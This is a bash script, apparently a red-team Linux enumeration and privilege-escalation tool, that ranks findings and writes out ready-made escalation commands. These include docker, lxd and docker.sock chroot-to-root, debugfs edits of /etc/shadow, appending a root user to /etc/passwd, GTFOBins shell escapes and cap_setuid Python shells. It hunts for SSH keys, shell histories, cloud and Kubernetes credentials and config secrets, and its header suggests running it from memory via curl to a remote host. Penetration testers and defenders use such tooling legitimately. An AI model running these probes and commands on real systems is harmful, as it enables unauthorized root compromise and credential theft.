#!/usr/bin/env bash
# ============================================================================
# rt-linenum.sh  -  Red Team LOCAL enumeration & privilege-escalation triage
#                   for Linux hosts. A LinPEAS-lite with a ranked findings
#                   model that matches Invoke-RTEnum.ps1 (Windows).
#
# GOAL     One pass -> a timestamped loot dir with ranked HIGH/MED/INFO
#          findings, per-section dumps, a NEXT_STEPS file of pre-filled
#          escalation commands, and optional findings.json.
#
# DESIGN   Read-only. No dependencies beyond coreutils; every probe degrades
#          gracefully when a tool/path is missing. Safe to re-run per hop.
#
# USAGE    ./rt-linenum.sh                 # full local triage -> ./rtenum_<host>_<ts>/
#          ./rt-linenum.sh -o /dev/shm     # choose output base dir
#          ./rt-linenum.sh -q              # quick (skip slow full-FS SUID/world-write walks)
#          ./rt-linenum.sh -j              # also write findings.json
#          ./rt-linenum.sh --only creds,suid,sudo
#          ./rt-linenum.sh --skip network
#
#          Tip: curl it to memory on a target with no disk write you want kept:
#            bash <(curl -s http://you/rt-linenum.sh) -o /dev/shm
# ============================================================================
set -u

# ----------------------------- framework -----------------------------
OUTBASE="."
QUICK=0
JSON=0
ONLY=""
SKIP=""
while [ $# -gt 0 ]; do
  case "$1" in
    -o) OUTBASE="$2"; shift 2;;
    -q|--quick) QUICK=1; shift;;
    -j|--json) JSON=1; shift;;
    --only) ONLY="$2"; shift 2;;
    --skip) SKIP="$2"; shift 2;;
    -h|--help) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0;;
    *) echo "unknown arg: $1"; exit 1;;
  esac
done

HOST=$(hostname 2>/dev/null || echo unknown)
TS=$(date +%Y%m%d_%H%M%S)
RUN="${OUTBASE%/}/rtenum_${HOST}_${TS}"
mkdir -p "$RUN" 2>/dev/null || { echo "[-] cannot create $RUN"; exit 1; }

# colors (disabled if not a tty)
if [ -t 1 ]; then R=$'\e[31m'; Y=$'\e[33m'; C=$'\e[36m'; G=$'\e[32m'; D=$'\e[90m'; N=$'\e[0m'; else R=; Y=; C=; G=; D=; N=; fi

SUMMARY="$RUN/00_SUMMARY.txt"
NEXT="$RUN/NEXT_STEPS.txt"
JFILE="$RUN/findings.json"
: > "$SUMMARY"; : > "$NEXT"
HIGHN=0; MEDN=0; INFON=0
declare -a J_HIGH=() J_MED=() J_INFO=() J_NEXT=()

sect(){ printf '\n%s[==== %s ====]%s\n' "$C" "$1" "$N"; }
# flag SEV "text"
flag(){
  sev="$1"; shift; txt="$*"
  case "$sev" in
    HIGH) col=$R; tag="[HIGH]"; HIGHN=$((HIGHN+1)); J_HIGH+=("$txt");;
    MED)  col=$Y; tag="[MED ]"; MEDN=$((MEDN+1));  J_MED+=("$txt");;
    *)    col=$D; tag="[INFO]"; INFON=$((INFON+1)); J_INFO+=("$txt");;
  esac
  printf '%s%s %s%s\n' "$col" "$tag" "$txt" "$N"
  printf '%s %s\n' "$tag" "$txt" >> "$SUMMARY"
}
# nextstep "title" "command"
nextstep(){ printf '[*] %s\n    %s\n\n' "$1" "$2" >> "$NEXT"; J_NEXT+=("$1 :: $2"); }
save(){ cat > "$RUN/$1"; }   # usage: some_cmd | save 01_x.txt
# section gate
runs(){
  # args: keyword list for this section
  if [ -n "$SKIP" ]; then for k in "$@"; do case ",$SKIP," in *",$k,"*) return 1;; esac; done; fi
  if [ -n "$ONLY" ]; then for k in "$@"; do case ",$ONLY," in *",$k,"*) return 0;; esac; done; return 1; fi
  return 0
}
has(){ command -v "$1" >/dev/null 2>&1; }
# timeout-guard for heavy filesystem walks (prevents hangs on network mounts / proc loops)
if has timeout; then TG(){ timeout 90 "$@"; }; else TG(){ "$@"; }; fi

echo "${G}[*] rt-linenum  ->  $RUN${N}"
echo "${D}[*] $(date)  as $(id -un 2>/dev/null)  quick=$QUICK${N}"

# ----------------------------- context -----------------------------
if runs context id sudo; then
  sect "Current context (id, groups, sudo)"
  {
    echo "== id =="; id 2>/dev/null
    echo; echo "== whoami / groups =="; whoami 2>/dev/null; groups 2>/dev/null
    echo; echo "== sudo -l (non-interactive) =="; sudo -n -l 2>/dev/null
  } | save 00_context.txt

  MYUID=$(id -u 2>/dev/null)
  [ "$MYUID" = "0" ] && flag MED "Already running as root (uid 0)."

  # dangerous group memberships
  GRPS=$(id -Gn 2>/dev/null)
  case " $GRPS " in
    *" docker "*)  flag HIGH "Member of 'docker' group -> trivially root via the Docker socket."
                   nextstep "docker group -> root" "docker run -v /:/mnt --rm -it alpine chroot /mnt sh";;
  esac
  case " $GRPS " in
    *" lxd "*|*" lxc "*) flag HIGH "Member of 'lxd/lxc' group -> mount host FS in a privileged container -> root."
                         nextstep "lxd group -> root" "lxc init alpine r -c security.privileged=true; lxc config device add r d disk source=/ path=/mnt/root recursive=true; lxc start r; lxc exec r sh";;
  esac
  case " $GRPS " in
    *" disk "*)  flag HIGH "Member of 'disk' group -> raw block access -> read/modify any file (debugfs)."
                 nextstep "disk group -> root" "debugfs -w /dev/sda1  # then edit /etc/shadow or read any file";;
  esac
  case " $GRPS " in
    *" adm "*)   flag INFO "Member of 'adm' group -> read system logs (creds often leak there).";;
    *" sudo "*|*" wheel "*) flag INFO "Member of sudo/wheel group (check 'sudo -l').";;
    *" shadow "*) flag HIGH "Member of 'shadow' group -> read /etc/shadow -> offline crack."; nextstep "shadow group" "cat /etc/shadow | tee shadow.txt  # john/hashcat";;
  esac

  # sudo -l results
  SUDOL=$(sudo -n -l 2>/dev/null)
  if [ -n "$SUDOL" ]; then
    echo "$SUDOL" | grep -qi 'NOPASSWD' && flag HIGH "sudo NOPASSWD entries present (see 00_context.txt) -> check GTFOBins for each binary."
    echo "$SUDOL" | grep -qi '(ALL.*: *ALL) *ALL' && flag HIGH "sudo ALL:ALL -> full root: sudo su -"
    echo "$SUDOL" | grep -Eqi '/(vi|vim|nano|less|more|awk|find|python|perl|ruby|nmap|tar|zip|env|bash|sh|man|ftp|gdb|docker|systemctl)' && \
      { flag HIGH "sudo allows a GTFOBins-abusable binary -> root."; nextstep "sudo GTFOBins" "# e.g. sudo find . -exec /bin/sh \\; -quit   |   sudo vim -c ':!/bin/sh'   |   check gtfobins.github.io"; }
  fi
fi

# ----------------------------- system / kernel -----------------------------
if runs system kernel os; then
  sect "System, kernel & distro (exploit hints)"
  {
    echo "== uname =="; uname -a 2>/dev/null
    echo; echo "== os-release =="; cat /etc/os-release 2>/dev/null || cat /etc/*release 2>/dev/null
    echo; echo "== sudo version =="; sudo --version 2>/dev/null | head -1
  } | save 01_system.txt

  KREL=$(uname -r 2>/dev/null)
  KMAJ=$(echo "$KREL" | cut -d. -f1); KMIN=$(echo "$KREL" | cut -d. -f2)
  flag INFO "Kernel: $KREL"
  # Dirty Pipe (5.8 - 5.16.11)
  if [ -n "$KMAJ" ] && [ "$KMAJ" -eq 5 ] 2>/dev/null && [ -n "$KMIN" ] && [ "$KMIN" -ge 8 ] 2>/dev/null && [ "$KMIN" -le 16 ] 2>/dev/null; then
    flag HIGH "Kernel $KREL in Dirty Pipe range (CVE-2022-0847) -> overwrite read-only files -> root."
    nextstep "Dirty Pipe" "# build & run CVE-2022-0847 PoC (writes to /etc/passwd or a suid binary)"
  fi
  # pkexec PwnKit (polkit) - presence of setuid pkexec is the signal
  if [ -u /usr/bin/pkexec ] 2>/dev/null; then
    flag HIGH "setuid pkexec present -> PwnKit (CVE-2021-4034) likely exploitable -> root."
    nextstep "PwnKit" "# build CVE-2021-4034 PoC; works on most unpatched polkit"
  fi
  # sudo Baron Samedit (< 1.9.5p2)
  SV=$(sudo --version 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+p?[0-9]*')
  [ -n "$SV" ] && flag INFO "sudo $SV - if < 1.9.5p2 check Baron Samedit (CVE-2021-3156)."
  has gcc && flag INFO "gcc present -> can compile kernel/local exploits on-host."
fi

# ----------------------------- SUID / SGID / caps -----------------------------
if runs suid sgid caps privesc; then
  sect "SUID / SGID binaries & capabilities"
  if [ "$QUICK" = "1" ]; then SEARCH="/usr/bin /usr/sbin /bin /sbin /usr/local/bin /usr/local/sbin"; else SEARCH="/"; fi
  SUIDLIST=$(TG find $SEARCH -perm -4000 -type f 2>/dev/null)
  echo "$SUIDLIST" | save 02_suid.txt
  # known GTFOBins-abusable SUID names
  GTFO='nmap|vim|find|bash|more|less|nano|cp|mv|awk|perl|python|ruby|env|tar|zip|gdb|man|make|dmesg|docker|systemctl|nohup|socat|cpan|pico|rvim|flock|ionice|taskset|time'
  echo "$SUIDLIST" | grep -Ev '^$' | while read -r b; do
    base=$(basename "$b")
    echo "$base" | grep -Eq "^($GTFO)$" && echo "SUIDGTFO:$b"
  done | while read -r line; do :; done
  HITS=$(echo "$SUIDLIST" | while read -r b; do base=$(basename "$b" 2>/dev/null); echo "$base" | grep -Eq "^($GTFO)$" && echo "$b"; done)
  if [ -n "$HITS" ]; then
    flag HIGH "SUID GTFOBins binaries present: $(echo "$HITS" | tr '\n' ' ')"
    nextstep "SUID GTFOBins" "# e.g. ./find . -exec /bin/sh -p \\; -quit  ;  check gtfobins.github.io for each (use -p to keep euid)"
  fi
  # non-standard SUID (not in a common allowlist) worth manual review
  echo "$SUIDLIST" | grep -Ev '/(sudo|su|mount|umount|passwd|chsh|chfn|gpasswd|newgrp|ping|pkexec|fusermount|ssh-keysign|dbus-daemon-launch-helper|polkit|unix_chkpwd|at|crontab|snap-confine|chrome-sandbox|sg|expiry)$' 2>/dev/null \
    | grep -Ev '^$' | head -20 | sed 's/^/  non-standard SUID: /' >> "$RUN/02_suid.txt"

  if has getcap; then
    sect "File capabilities (getcap)"
    CAPS=$( (TG getcap -r / 2>/dev/null) || true)
    echo "$CAPS" | save 02b_caps.txt
    echo "$CAPS" | grep -Eq 'cap_setuid|cap_dac_override|cap_dac_read_search|cap_sys_admin|cap_sys_ptrace' && {
      flag HIGH "Dangerous file capability set (cap_setuid/dac_*/sys_admin): see 02b_caps.txt -> likely root."
      nextstep "capability abuse" "# e.g. python3 with cap_setuid+ep: ./python -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'"
    }
  fi
fi

# ----------------------------- cron / timers -----------------------------
if runs cron timers tasks; then
  sect "Cron jobs & systemd timers (writable targets)"
  {
    echo "== /etc/crontab =="; cat /etc/crontab 2>/dev/null
    echo; echo "== /etc/cron.d =="; ls -la /etc/cron.d 2>/dev/null; cat /etc/cron.d/* 2>/dev/null
    echo; echo "== cron.{hourly,daily} =="; ls -la /etc/cron.hourly /etc/cron.daily 2>/dev/null
    echo; echo "== user crontab =="; crontab -l 2>/dev/null
    echo; echo "== systemd timers =="; systemctl list-timers --all 2>/dev/null
  } | save 03_cron.txt
  # writable scripts referenced by cron
  for f in /etc/crontab /etc/cron.d/*; do
    [ -f "$f" ] || continue
    awk '{for(i=6;i<=NF;i++) if($i ~ /^\//) print $i}' "$f" 2>/dev/null | while read -r scr; do
      [ -w "$scr" ] 2>/dev/null && flag HIGH "Cron runs a WRITABLE script: $scr (edit it -> code exec as the cron user/root)."
    done
  done
  # world-writable scripts in cron dirs
  find /etc/cron* -type f -perm -002 2>/dev/null | while read -r f; do flag HIGH "World-writable cron file: $f"; done
fi

# ----------------------------- writable sensitive files -----------------------------
if runs writable files passwd privesc; then
  sect "Writable sensitive files & PATH"
  [ -w /etc/passwd ] && { flag HIGH "/etc/passwd is WRITABLE -> add a root user."; nextstep "writable /etc/passwd" "openssl passwd -1 -salt x pass  ->  echo 'r:HASH:0:0::/root:/bin/bash' >> /etc/passwd ; su r"; }
  [ -w /etc/shadow ] && flag HIGH "/etc/shadow is WRITABLE -> replace root hash."
  [ -w /etc/sudoers ] && flag HIGH "/etc/sudoers is WRITABLE -> grant yourself NOPASSWD ALL."
  [ -r /etc/shadow ] && flag HIGH "/etc/shadow is READABLE -> offline crack root hash (john/hashcat)."
  # writable dirs in PATH
  echo "$PATH" | tr ':' '\n' | while read -r p; do
    [ -n "$p" ] && [ -d "$p" ] && [ -w "$p" ] && flag MED "Writable directory in PATH: $p (plant a binary to hijack commands)."
  done
  # writable systemd service files
  find /etc/systemd/system /lib/systemd/system -name '*.service' -perm -002 2>/dev/null | while read -r s; do
    flag HIGH "World-writable systemd service: $s -> edit ExecStart -> root on restart."
  done
  # NFS exports with no_root_squash
  if [ -r /etc/exports ]; then
    grep -q 'no_root_squash' /etc/exports 2>/dev/null && { flag HIGH "/etc/exports has no_root_squash -> mount from attacker box, drop SUID root shell."; grep no_root_squash /etc/exports | save 04b_exports.txt; }
  fi
fi

# ----------------------------- credentials on disk -----------------------------
if runs creds credentials secrets keys; then
  sect "Credentials: keys, histories, configs, cloud/kube"
  {
    echo "== SSH private keys (readable) =="
    TG find / -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null | head -40
    echo; echo "== authorized_keys / known_hosts =="
    TG find / -name 'authorized_keys' 2>/dev/null | head -40
  } | save 05_creds.txt
  # readable private keys
  TG find / \( -name 'id_rsa' -o -name '*.pem' -o -name 'id_ed25519' \) -readable 2>/dev/null | head -20 | while read -r k; do
    [ -r "$k" ] && flag MED "Readable private key: $k"
  done
  # history files
  for h in ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.psql_history /root/.bash_history; do
    [ -r "$h" ] || continue
    grep -Ei 'pass|pwd|secret|token|key|mysql -u|psql|curl .*-u |ssh |scp ' "$h" 2>/dev/null | head -20 | sed "s|^|$h: |" >> "$RUN/05_creds.txt"
    grep -Eqi 'pass=|password|-p[^ ]|secret|token' "$h" 2>/dev/null && flag MED "Credential-shaped lines in history: $h"
  done
  # cloud / k8s creds
  for c in ~/.aws/credentials ~/.azure ~/.config/gcloud ~/.kube/config /var/run/secrets/kubernetes.io; do
    [ -e "$c" ] && { flag HIGH "Cloud/K8s credential material present: $c -> pivot to cloud (run rt-cloudenum.sh)."; echo "FOUND: $c" >> "$RUN/05_creds.txt"; }
  done
  # .env / config secrets (shallow, common app dirs)
  find /var/www /opt /srv /home /app -maxdepth 4 \( -name '.env' -o -name '*.conf' -o -name 'config.php' -o -name 'settings.py' -o -name 'database.yml' \) 2>/dev/null \
    | head -40 | while read -r f; do
      grep -Eqi 'pass(word)?|secret|api[_-]?key|token|DB_' "$f" 2>/dev/null && { flag MED "Secret-shaped values in config: $f"; echo "CFG: $f" >> "$RUN/05_creds.txt"; }
    done
fi

# ----------------------------- containers -----------------------------
if runs containers docker; then
  sect "Container / escape surface"
  {
    [ -f /.dockerenv ] && echo "/.dockerenv present -> inside a Docker container"
    grep -qa 'docker\|lxc\|kubepods' /proc/1/cgroup 2>/dev/null && echo "cgroup indicates containerized"
    echo "== capsh =="; capsh --print 2>/dev/null
  } | save 06_container.txt
  if [ -f /.dockerenv ] || grep -qa 'docker\|lxc\|kubepods' /proc/1/cgroup 2>/dev/null; then
    flag INFO "Running inside a container - look for escape (privileged, mounted socket, SYS_ADMIN cap)."
  fi
  # docker socket reachable
  if [ -S /var/run/docker.sock ] && [ -w /var/run/docker.sock ]; then
    flag HIGH "Writable /var/run/docker.sock -> spawn a privileged container -> host root."
    nextstep "docker.sock escape" "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"
  fi
  # privileged container hint
  capsh --print 2>/dev/null | grep -q 'cap_sys_admin' && flag HIGH "Container holds CAP_SYS_ADMIN -> likely escapable to host."
fi

# ----------------------------- processes / software -----------------------------
if runs processes software; then
  sect "Processes as root with writable binaries"
  ps -eo user,pid,cmd 2>/dev/null | save 07_processes.txt
  # root processes whose executable is writable by us
  ps -eo user,pid,comm 2>/dev/null | awk '$1=="root"{print $2}' | head -200 | while read -r pid; do
    exe=$(readlink -f "/proc/$pid/exe" 2>/dev/null)
    [ -n "$exe" ] && [ -w "$exe" ] 2>/dev/null && flag HIGH "Root process binary is WRITABLE: pid $pid -> $exe"
  done
fi

# ----------------------------- network -----------------------------
if runs network net ports; then
  sect "Network: interfaces, listeners, hosts"
  {
    echo "== interfaces =="; (ip a 2>/dev/null || ifconfig -a 2>/dev/null)
    echo; echo "== routes =="; (ip r 2>/dev/null || route -n 2>/dev/null)
    echo; echo "== listeners =="; (ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null)
    echo; echo "== /etc/hosts =="; cat /etc/hosts 2>/dev/null
    echo; echo "== resolv.conf =="; cat /etc/resolv.conf 2>/dev/null
  } | save 08_network.txt
  # services only on loopback = pivot candidates
  (ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null) | grep -E '127\.0\.0\.1|::1' | grep -qi listen && \
    flag INFO "Loopback-only services present (see 08_network.txt) - port-forward to reach them."
  # is this host domain-joined / AD aware?
  { [ -f /etc/krb5.conf ] || has realm || [ -d /var/lib/sss ]; } && \
    flag INFO "Host looks AD/Kerberos-aware (krb5.conf / sssd / realm) -> run rt-adenum.sh."
fi

# ----------------------------- summary -----------------------------
sect "Writing ranked summary"
{
  echo "rt-linenum summary - $HOST - $(date)"
  echo "Identity: $(id -un 2>/dev/null)  uid=$(id -u 2>/dev/null)"
  echo
  echo "### HIGH ($HIGHN) ###"; printf '%s\n' "${J_HIGH[@]:-}"
  echo; echo "### MED ($MEDN) ###";  printf '%s\n' "${J_MED[@]:-}"
  echo; echo "### INFO ($INFON) ###"; printf '%s\n' "${J_INFO[@]:-}"
  echo; echo "=== RECOMMENDED NEXT MOVE ==="
  if [ -s "$NEXT" ]; then head -2 "$NEXT" | sed 's/^\[\*\] /-> /'; else echo "-> No scripted finding. Review HIGH list, then pivot (containers/network/AD)."; fi
} > "$SUMMARY"

if [ "$JSON" = "1" ]; then
  jarr(){ printf '['; first=1; shift; for e in "$@"; do [ $first -eq 1 ]||printf ','; first=0; printf '%s' "$e" | sed 's/\\/\\\\/g;s/"/\\"/g' | awk '{printf "\"%s\"",$0}'; done; printf ']'; }
  {
    printf '{\n'
    printf '  "host":"%s","identity":"%s","ts":"%s",\n' "$HOST" "$(id -un 2>/dev/null)" "$TS"
    printf '  "high":'; jarr x "${J_HIGH[@]:-}"; printf ',\n'
    printf '  "med":';  jarr x "${J_MED[@]:-}";  printf ',\n'
    printf '  "info":'; jarr x "${J_INFO[@]:-}"; printf ',\n'
    printf '  "next_steps":'; jarr x "${J_NEXT[@]:-}"; printf '\n'
    printf '}\n'
  } > "$JFILE"
fi

echo
echo "${G}[+] Done. HIGH=$HIGHN MED=$MEDN INFO=$INFON${N}"
echo "${G}[+] Read: $SUMMARY  and  $NEXT${N}"
